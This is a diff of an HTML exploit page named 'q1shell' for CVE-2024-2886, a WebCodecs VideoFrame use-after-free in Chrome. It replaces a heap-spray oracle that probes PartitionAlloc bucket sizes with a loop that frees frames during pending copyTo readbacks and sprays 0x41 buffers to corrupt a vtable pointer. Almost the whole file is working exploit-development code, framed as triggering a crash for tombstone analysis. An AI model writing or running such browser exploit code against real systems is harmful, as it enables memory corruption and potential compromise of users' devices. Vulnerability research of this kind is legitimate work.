@@ -1,94 +1,85 @@
 <!doctype html>
 <html>
-<head><title>q1shell</title></head>
+<head><title>q1shell - crash</title></head>
 <body style="background:#000;color:#0f0;font-family:monospace;font-size:12px;padding:20px;">
 <div id="out"></div>
 <script>
 const log = s => { out.innerHTML += s + '<br>'; console.log(s); };
 
-async function pwn() {
-    log('CVE-2024-2886 — C++ wrapper size oracle');
-    log('Finding freed VideoFrame wrapper size via spray sizes');
+async function crash() {
+    log('CVE-2024-2886 — intentional crash for tombstone analysis');
     log('');
 
     const canvas = new OffscreenCanvas(64, 64);
     const gl = canvas.getContext('webgl');
 
-    // Helper: does spray of given size affect the UAF output?
-    async function testSpraySize(spraySize, fillByte) {
-        gl.clearColor(1.0, 0.0, 0.0, 1.0);
-        gl.clear(gl.COLOR_BUFFER_BIT);
-        gl.finish();
+    // Aggressively trigger UAF to force a real crash
+    // Instead of await-ing the promise, fire many simultaneously
+    // and try to corrupt the vtable call
 
-        const frame = new VideoFrame(canvas, { timestamp: performance.now() });
-        const buf = new Uint8Array(frame.allocationSize());
-        const p = frame.copyTo(buf);
-        frame.close();
+    let attempt = 0;
+    let crashed = false;
 
-        // Spray with specific size
-        const spray = [];
-        for (let i = 0; i < 200; i++) {
-            const s = new Uint8Array(spraySize);
-            s.fill(fillByte);
-            spray.push(s);
+    while (!crashed) {
+        attempt++;
+        
+        // Create many frames simultaneously
+        const frames = [];
+        const promises = [];
+        const bufs = [];
+
+        for (let i = 0; i < 50; i++) {
+            gl.clearColor(Math.random(), Math.random(), Math.random(), 1.0);
+            gl.clear(gl.COLOR_BUFFER_BIT);
+            gl.finish();
+            
+            const frame = new VideoFrame(canvas, { timestamp: attempt * 1000 + i });
+            const buf = new Uint8Array(frame.allocationSize());
+            bufs.push(buf);
+            
+            // Start async readback
+            const p = frame.copyTo(buf);
+            promises.push(p);
+            frames.push(frame);
         }
 
-        await p;
-        spray.length = 0;
+        // Free ALL frames immediately while ALL readbacks are pending
+        for (const f of frames) {
+            f.close();
+        }
 
-        // Check if fillByte appears in output
-        const hit = buf.some(b => b === fillByte);
-        return hit;
-    }
+        // Now aggressively allocate to try to reclaim freed memory
+        // with garbage that will corrupt the vtable pointer
+        const trash = [];
+        for (let i = 0; i < 2000; i++) {
+            // Allocate various sizes to hit the right bucket
+            trash.push(new Uint8Array(32).fill(0x41));
+            trash.push(new Uint8Array(64).fill(0x41));
+            trash.push(new Uint8Array(128).fill(0x41));
+        }
 
-    // Baseline: what bytes do we normally get?
-    gl.clearColor(1.0, 0.0, 0.0, 1.0);
-    gl.clear(gl.COLOR_BUFFER_BIT);
-    gl.finish();
-    const frameB = new VideoFrame(canvas, { timestamp: 0 });
-    const bufB = new Uint8Array(frameB.allocationSize());
-    await frameB.copyTo(bufB);
-    frameB.close();
-    log('[baseline] size=' + bufB.length + ' first8: ' +
-        Array.from(bufB.slice(0,8)).map(x=>x.toString(16).padStart(2,'0')).join(' '));
+        try {
+            await Promise.all(promises);
+            trash.length = 0;
+            
+            if (attempt % 10 === 0) {
+                log('attempt ' + attempt + ' — still no crash, continuing...');
+            }
+        } catch(e) {
+            log('ERROR on attempt ' + attempt + ': ' + e.message);
+            // If we see an error here the vtable might be corrupted
+            crashed = true;
+        }
 
-    // The baseline bytes - we're looking for our spray byte 0xDD to appear
-    // 0xDD should not naturally appear in red frame data
-    const FILL = 0xDD;
-    if (bufB.some(b => b === FILL)) {
-        log('[!] 0xDD naturally in baseline - picking different byte');
-    }
-
-    log('');
-    log('Testing spray sizes (looking for 0xDD in output):');
-
-    // Try common PartitionAlloc bucket sizes
-    // Chrome's PartitionAlloc uses sizes: 32, 64, 128, 192, 256, 320, 384, 448, 512,
-    // 576, 640, 704, 768, 832, 896, 960, 1024, 1152, 1280, 1408, 1536...
-    const sizes = [32, 48, 64, 80, 96, 112, 128, 160, 192, 224, 256,
-                   320, 384, 448, 512, 576, 640, 704, 768, 832, 896,
-                   960, 1024, 1088, 1152, 1280, 1408, 1536, 1664, 1792, 2048];
-
-    const hits = [];
-    for (const sz of sizes) {
-        const hit = await testSpraySize(sz, FILL);
-        log('  size=' + sz + ': ' + (hit ? 'HIT 0xDD FOUND' : 'miss'));
-        if (hit) hits.push(sz);
-        await new Promise(r => setTimeout(r, 50)); // small delay between tests
-    }
-
-    log('');
-    if (hits.length > 0) {
-        log('HIT sizes: ' + hits.join(', '));
-        log('Smallest hit = likely freed C++ wrapper size: ' + Math.min(...hits));
-        log('This is our spray target allocation size');
-    } else {
-        log('No hits - spray not reaching freed C++ object');
-        log('May need larger spray count or different approach');
+        if (attempt > 200) {
+            log('200 attempts done — crash may need more aggressive approach');
+            log('Check logcat for tombstone anyway');
+            break;
+        }
     }
 }
 
-pwn();
+crash();
 </script>
 </body>
 </html>
